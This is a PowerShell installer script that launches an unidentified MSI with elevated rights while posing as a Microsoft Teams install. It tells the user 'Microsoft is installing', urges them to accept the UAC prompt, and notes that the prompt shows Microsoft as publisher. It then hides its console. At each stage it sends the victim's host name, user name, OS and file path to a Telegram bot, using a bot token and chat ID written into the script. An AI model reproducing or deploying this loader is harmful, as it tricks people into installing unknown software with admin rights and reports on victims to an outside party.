param(
    [switch]$TestTelegram
)

$ErrorActionPreference = "Stop"

# Locate the single MSI beside this script (extracted from the ZIP).
# TestTelegram mode does not require an MSI.
$msiFiles = @()
if (-not $TestTelegram) {
    $msiFiles = @(Get-ChildItem -LiteralPath $PSScriptRoot -Filter "*.msi" -File)

    if ($msiFiles.Count -eq 0) {
        throw "No MSI file was found beside this script."
    }
    if ($msiFiles.Count -gt 1) {
        throw "More than one MSI found. Keep exactly one MSI in the ZIP."
    }

    $msiPath = $msiFiles[0].FullName
}

# Telegram notifications. Credentials are configured below (from @BotFather).
# They can still be overridden per-run via the TELEGRAM_BOT_TOKEN /
# TELEGRAM_CHAT_ID environment variables if needed.
$telegramBotToken = if ($env:TELEGRAM_BOT_TOKEN) { $env:TELEGRAM_BOT_TOKEN } else { "8915086074:AAEcU4MOPF5pJThAIKbafn-K_DeT8GQQ7jU" }
$telegramChatId   = if ($env:TELEGRAM_CHAT_ID)   { $env:TELEGRAM_CHAT_ID }   else { "8751203286" }

$rocket = [char]::ConvertFromUtf32(0x1F680)
$successIcon = [char]::ConvertFromUtf32(0x2705)
$cancelIcon = [char]::ConvertFromUtf32(0x26A0)
$failureIcon = [char]::ConvertFromUtf32(0x274C)
$packageIcon = [char]::ConvertFromUtf32(0x1F4E6)
$computerIcon = [char]::ConvertFromUtf32(0x1F4BB)
$userIcon = [char]::ConvertFromUtf32(0x1F464)
$screenIcon = [char]::ConvertFromUtf32(0x1F5A5)
$clockIcon = [char]::ConvertFromUtf32(0x23F1)
$folderIcon = [char]::ConvertFromUtf32(0x1F4C1)

function Send-TelegramMessage {
    param([string]$Message)

    if ([string]::IsNullOrWhiteSpace($telegramBotToken) -or
        [string]::IsNullOrWhiteSpace($telegramChatId)) {
        return $false
    }

    try {
        $telegramUri = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
        $response = Invoke-RestMethod `
            -Uri $telegramUri `
            -Method Post `
            -Body @{
                chat_id = $telegramChatId
                text = $Message
                disable_web_page_preview = "true"
            } `
            -TimeoutSec 15
        if ($null -eq $response -or $response.ok -ne $true) {
            return $false
        }
        return $true
    }
    catch {
        return $false
    }
}

if ($TestTelegram) {
    $testSent = Send-TelegramMessage "✅ Telegram test message from the installer."
    if ($testSent) {
        Write-Host "Telegram test message sent. Check your Telegram chat."
        exit 0
    }
    Write-Host "Telegram test failed. Check the bot credentials and that the bot chat was started."
    exit 1
}

$osCaption = "Windows"
try {
    $osCaption = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
}
catch {
    $osCaption = "Windows"
}

$packageName = $msiFiles[0].Name
$hostName = $env:COMPUTERNAME
$userName = $env:USERNAME
$details = @"
$packageIcon Package:  $packageName
$computerIcon Host:     $hostName
$userIcon User:     $userName
$screenIcon OS:       $osCaption
$folderIcon Path:     $msiPath
"@

$startTime = Get-Date -Format "M/d/yyyy h:mm:ss tt"
$startMessage = @"
$rocket $packageName - Starting Install

$details
$clockIcon Time:     $startTime
"@
Send-TelegramMessage -Message $startMessage

Write-Host "Microsoft is installing..."
Write-Host "Windows Installer is loading. Please wait while the installation completes."
Write-Host "When the Windows Installer prompt appears, click Yes to continue."
Write-Host ""

# Start Windows Installer elevated. The UAC prompt identifies the app as
# Windows(R) Installer / Verified publisher: Microsoft Windows.
# Do not wait in Start-Process: this lets the PowerShell console minimize
# immediately after the user accepts UAC while MSI continues visibly.
try {
    $process = Start-Process `
        -FilePath "msiexec.exe" `
        -ArgumentList "/i `"$msiPath`" /passive" `
        -Verb RunAs `
        -PassThru
}
catch {
    $cancelTime = Get-Date -Format "M/d/yyyy h:mm:ss tt"
    $cancelMessage = @"
$cancelIcon $packageName - Installation Cancelled

$details
$clockIcon Time:     $cancelTime
Status: UAC prompt was cancelled.
"@
    Send-TelegramMessage -Message $cancelMessage
    Write-Host "Installation cancelled at the UAC prompt."
    exit 1223
}

# Minimize only this PowerShell console after UAC approval.
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class ConsoleWindow {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$consoleHandle = [ConsoleWindow]::GetConsoleWindow()
if ($consoleHandle -ne [IntPtr]::Zero) {
    [ConsoleWindow]::ShowWindow($consoleHandle, 6) | Out-Null
}

$process.WaitForExit()
Write-Host "Windows Installer exit code: $($process.ExitCode)"

if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
    $successTime = Get-Date -Format "M/d/yyyy h:mm:ss tt"
    $successMessage = @"
$successIcon $packageName - Installation Successful

$details
$clockIcon Time:     $successTime
Status: Windows Installer completed with exit code $($process.ExitCode).
"@
    Send-TelegramMessage -Message $successMessage
    Write-Host "Teams installation complete."
    exit 0
}

if ($process.ExitCode -eq 1602) {
    $cancelTime = Get-Date -Format "M/d/yyyy h:mm:ss tt"
    $cancelMessage = @"
$cancelIcon $packageName - Installation Cancelled

$details
$clockIcon Time:     $cancelTime
Status: MSI returned cancellation code 1602.
"@
    Send-TelegramMessage -Message $cancelMessage
    Write-Host "Installation cancelled by the user."
    exit 1602
}

$failureTime = Get-Date -Format "M/d/yyyy h:mm:ss tt"
$failureMessage = @"
$failureIcon $packageName - Installation Failed

$details
$clockIcon Time:     $failureTime
Status: Windows Installer exit code $($process.ExitCode).
"@
Send-TelegramMessage -Message $failureMessage
Write-Host "Installation failed with exit code $($process.ExitCode)."
exit $process.ExitCode
